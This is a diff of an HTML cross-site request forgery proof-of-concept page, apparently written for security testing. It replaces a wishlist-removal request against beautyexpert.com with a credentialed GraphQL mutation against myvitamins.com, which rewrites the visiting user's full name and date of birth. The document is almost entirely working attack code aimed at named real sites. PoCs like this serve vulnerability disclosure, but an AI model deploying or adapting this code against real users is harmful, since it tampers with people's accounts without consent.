@@ -1,32 +1,47 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>CSRF PoC - Remove Wishlist Item</h1>
-    <button onclick="sendRequest()">Remove Item from Wishlist</button>
+    <h2>CSRF PoC: Update Account Details</h2>
+    <button onclick="sendCSRF()">Submit CSRF Request</button>
     <p id="status"></p>
 
     <script>
-      function sendRequest() {
-        fetch("https://www.beautyexpert.com/wishlist/removeFrom.collections?fromWishlist=true&productID=12595875", {
-          method: "DELETE",
+      function sendCSRF() {
+        fetch("https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails", {
+          method: "POST",
           credentials: "include",
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify(["12595875"])
+          body: JSON.stringify({
+            query: `mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
+              updateAccountSettings(input: $input) {
+                error
+                fieldErrors {
+                  fieldName
+                  validators
+                  requiredButNotProvided
+                  invalidOption
+                }
+              }
+            }`,
+            variables: {
+              input: [
+                { fieldName: "fullName", value: "Tester" },
+                { fieldName: "dateOfBirth", value: "03-03-2003" }
+              ]
+            }
+          })
         })
         .then(res => {
-          if (res.ok) {
-            document.getElementById("status").textContent = "Item successfully removed.";
-            document.getElementById("status").style.color = "green";
-          } else {
-            document.getElementById("status").textContent = "Failed to remove item (HTTP " + res.status + ")";
-            document.getElementById("status").style.color = "red";
-          }
+          if (!res.ok) throw new Error("Request failed");
+          return res.text();
         })
-        .catch(error => {
-          document.getElementById("status").textContent = "Error: " + error;
-          document.getElementById("status").style.color = "red";
+        .then(data => {
+          document.getElementById("status").textContent = "CSRF Sent Successfully!";
+        })
+        .catch(err => {
+          document.getElementById("status").textContent = "Error: " + err;
         });
       }
     </script>
